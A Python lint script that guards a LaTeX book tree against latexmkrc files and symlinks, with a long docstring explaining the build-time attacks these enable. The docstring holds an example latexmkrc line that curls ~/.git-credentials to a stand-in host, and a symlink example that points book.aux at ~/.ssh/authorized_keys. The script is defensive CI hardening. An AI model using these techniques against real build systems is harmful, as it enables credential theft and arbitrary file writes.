#!/usr/bin/env python3
"""Keep the book tree free of files that turn a book build into an exploit.

Two bans, both absolute, both cheap because the tree already satisfies them:

1. no ``latexmkrc`` / ``.latexmkrc`` — latexmk ``eval``s those as Perl;
2. **no symlinks at all** — the book build writes through them.

Why symlinks are banned outright rather than by name
-----------------------------------------------------

The first version of this guard lived in ``check-book-compile.sh`` and checked
two filenames: ``figures/*.pdf`` and ``book.pdf``. That was the wrong shape, and
review caught it. A XeLaTeX run writes at least eight files into the book
directory::

    book.aux  book.log  book.toc  book.out  book.bbl  book.idx  book.xdv
    book.fdb_latexmk   book.fls        <- latexmk's own, written from Perl

``openout_any=p`` does not save any of them. It vets the *name* — rejecting
absolute paths, ``..`` and dotfiles — and then hands the name to
``fopen(name, "w")``, which follows the symlink. ``book.fdb_latexmk`` and
``book.fls`` never see a TeX-side check at all, because latexmk writes them
itself with a plain Perl ``open``.

So ``<track>/book/book.aux -> /home/runner/.ssh/authorized_keys`` is an
arbitrary write as the build user, from a pull request, needing no shell escape
and no ``latexmkrc``. Guarding ``book.pdf`` and stopping there would have left
seven doors open next to the one that got locked.

Enumerating the dangerous cases loses to banning the category. There are zero
symlinks under the book tree today, and no reason for a curriculum book to
contain one, so the ban costs nothing and cannot be outrun by the next file
XeLaTeX decides to write.

``.gitignore`` is not a boundary here, incidentally: ``book.aux`` and friends are
ignored, but ``git add -f`` commits them anyway.

Why the latexmkrc ban exists
----------------------------

``latexmk`` reads ``latexmkrc`` and ``.latexmkrc`` **from its current working
directory** and hands the contents to Perl's ``eval``. Not "parses as config" —
``eval``. Anything in that file runs, as the user running latexmk, before a
single line of TeX is looked at::

    # <track>/book/latexmkrc
    system("curl -d @$ENV{HOME}/.git-credentials https://elsewhere.example");

Every book in this repository is compiled with latexmk's working directory set
to ``code/learning/human-languages/<track>/book`` — a directory whose contents
arrive by pull request. So the file that gets ``eval``-ed is repository content,
and a pull request that adds one is a pull request that runs code on whatever
machine builds the books.

The primary control for that is ``latexmk -norc``, which stops the directory
being consulted at all. Every invocation in this repository passes it: the CI
job, ``check-book-compile.sh``, ``build-books-locally.sh``,
``verify-human-languages.sh``, and each track's own ``book/build.sh`` and
``build.ps1``.

This script is the *second* control, and it exists because the first one is a
flag — and a flag is only present where somebody remembered to type it. That is
not a hypothetical failure mode here: the CI job compiled every book **without**
``-norc`` for the whole time the local scripts had it, because the hardening was
added to the scripts and nobody swept the workflow. A flag protects the call
sites you fixed. A repository lint protects the ones you have not written yet.

So: the payload simply must not be in the tree. If it is not there, no missed
flag can matter.

What counts as a hit
--------------------

``latexmk`` consults exactly two names in its working directory, in this order:

===================  ==========================================================
``latexmkrc``        checked first
``.latexmkrc``       checked second
===================  ==========================================================

Both are matched **case-insensitively**. latexmk itself is case-sensitive about
them on Linux, where CI runs — but the repository is also checked out on Windows
and macOS, whose filesystems are not, and a ``LatexmkRC`` committed from a
case-insensitive checkout is a ``latexmkrc`` to everybody else. Matching loosely
costs nothing: no legitimate file in this tree is called any casing of that.

"Absent" and "could not determine" are different answers
--------------------------------------------------------

A directory this script could not read is **not** a directory with no
``latexmkrc`` in it. Reporting the second when it means the first is how a
security gate goes quietly green while checking nothing, so every unreadable
path is reported as ``COULD NOT DETERMINE``, names its ``errno``, and fails the
run just as loudly as a real hit would::

    COULD NOT DETERMINE  code/learning/human-languages/hindi/book
      OSError EACCES (13): Permission denied

Exit status
-----------

===  =========================================================================
0    every directory under the book root was read, and it is clean
1    at least one ``latexmkrc`` or symlink was found
2    at least one directory could not be read, so the answer is unknown
===  =========================================================================

Usage
-----

::

    python3 code/scripts/check_book_tree_hygiene.py \\
        --book-root code/learning/human-languages
"""

from __future__ import annotations

import argparse
import errno
import os
import sys
from pathlib import Path

# The two names latexmk consults in its working directory, lowercased for the
# case-insensitive comparison described above.
FORBIDDEN_NAMES = frozenset({"latexmkrc", ".latexmkrc"})


def describe_oserror(error: OSError) -> str:
    """Render an OSError so a reader can act on it without guessing.

    ``errno`` is included by *name* as well as number because "13" means
    nothing at a glance and ``EACCES`` means "fix the permissions". A stray
    OSError with no errno at all (it happens on Windows for some shapes) is
    reported as ``errno=None`` rather than being smoothed over into a plausible
    lie.
    """
    code = error.errno
    name = errno.errorcode.get(code, "?") if code is not None else "None"
    detail = error.strerror or str(error) or error.__class__.__name__
    return f"OSError {name} ({code}): {detail}"


def scan(
    book_root: Path,
) -> tuple[list[Path], list[Path], list[tuple[Path, OSError]]]:
    """Walk ``book_root`` and return ``(latexmkrc_hits, symlinks, unreadable)``.

    ``os.walk`` swallows errors by default — it simply yields nothing for a
    directory it cannot open, which would turn "unreadable" into "empty" at the
    exact moment that distinction matters most. The ``onerror`` hook is what
    keeps the two apart.

    ``followlinks`` is left at its default of ``False`` **on purpose** — do not
    "fix" it. Every symlink is a finding here, so there is nothing to gain by
    descending one, and following links costs a hang on a symlink loop in a step
    that runs before everything else in the build. Because links are reported
    rather than traversed, a symlinked *directory* is caught as a finding
    instead of being silently walked past.
    """
    hits: list[Path] = []
    symlinks: list[Path] = []
    unreadable: list[tuple[Path, OSError]] = []

    def on_error(error: OSError) -> None:
        raw = getattr(error, "filename", None)
        unreadable.append((Path(raw) if raw else book_root, error))

    for dirpath, dirnames, filenames in os.walk(book_root, onerror=on_error):
        # Directories first: with ``followlinks=False`` a symlinked directory is
        # listed here and never descended, so this is the only chance to see it.
        for name in dirnames + filenames:
            path = Path(dirpath) / name
            if path.is_symlink():
                symlinks.append(path)
            elif name.lower() in FORBIDDEN_NAMES:
                # `elif`: a symlink NAMED latexmkrc is reported once, as the
                # symlink it is. Both bans catch it; only one message is useful.
                hits.append(path)

    return sorted(hits), sorted(symlinks), unreadable


def describe_symlink(path: Path) -> str:
    """Name the link and where it points, without following it.

    ``os.readlink`` reads the link's own contents; it does not resolve or
    require the target to exist. A dangling link is still a finding — the target
    can be created later, or exist on the machine that matters and not this one.
    """
    try:
        target = os.readlink(path)
    except OSError as error:  # pragma: no cover - defensive
        return f"{path} -> <unreadable link: {describe_oserror(error)}>"
    return f"{path} -> {target}"


def main(argv: list[str] | None = None) -> int:
    parser = argparse.ArgumentParser(description=__doc__.splitlines()[0])
    parser.add_argument(
        "--book-root",
        default="code/learning/human-languages",
        type=Path,
        help="directory tree to scan (default: %(default)s)",
    )
    args = parser.parse_args(argv)
    book_root: Path = args.book_root

    # A missing root is "could not determine", not "clean". Scanning a path
    # that is not there and reporting success is the same conflation this
    # script exists to avoid, one level up.
    try:
        resolved = book_root.resolve(strict=True)
    except OSError as error:
        print(f"COULD NOT DETERMINE  {book_root}", file=sys.stderr)
        print(f"  {describe_oserror(error)}", file=sys.stderr)
        return 2
    if not resolved.is_dir():
        print(f"COULD NOT DETERMINE  {book_root}", file=sys.stderr)
        print(f"  OSError ENOTDIR ({errno.ENOTDIR}): not a directory", file=sys.stderr)
        return 2

    hits, symlinks, unreadable = scan(resolved)

    for path, error in unreadable:
        print(f"COULD NOT DETERMINE  {path}", file=sys.stderr)
        print(f"  {describe_oserror(error)}", file=sys.stderr)

    for hit in hits:
        print(f"FORBIDDEN latexmkrc  {hit}", file=sys.stderr)

    for link in symlinks:
        print(f"FORBIDDEN symlink    {describe_symlink(link)}", file=sys.stderr)

    if hits:
        print(
            "\nlatexmk `eval`s these as Perl when its working directory is the "
            "one holding them.\nDelete the file. If a book genuinely needs a "
            "latexmk setting, add it to\ncode/scripts/latexmk-safe.rc, which is "
            "loaded explicitly with `-norc -r` and is\nreviewed like any other "
            "script.",
            file=sys.stderr,
        )

    if symlinks:
        print(
            "\nA book build writes at least eight files into its own directory "
            "(book.aux,\nbook.log, book.toc, book.out, book.xdv, book.pdf, and "
            "latexmk's own\nbook.fdb_latexmk and book.fls). Every one of those "
            "writes follows a symlink,\nand `openout_any=p` does not stop it: "
            "that setting vets the NAME, then opens\nit. So a symlink here is an "
            "arbitrary write as the build user.\n\nNo book needs one. Replace the "
            "link with the real file, or delete it.",
            file=sys.stderr,
        )

    if hits or symlinks:
        return 1

    if unreadable:
        print(
            f"\n{len(unreadable)} path(s) could not be read, so this run did not "
            "establish that the\ntree is clean. That is not the same as finding "
            "nothing.",
            file=sys.stderr,
        )
        return 2

    print(f"no latexmkrc and no symlinks under {resolved}")
    return 0


if __name__ == "__main__":  # pragma: no cover
    sys.exit(main())
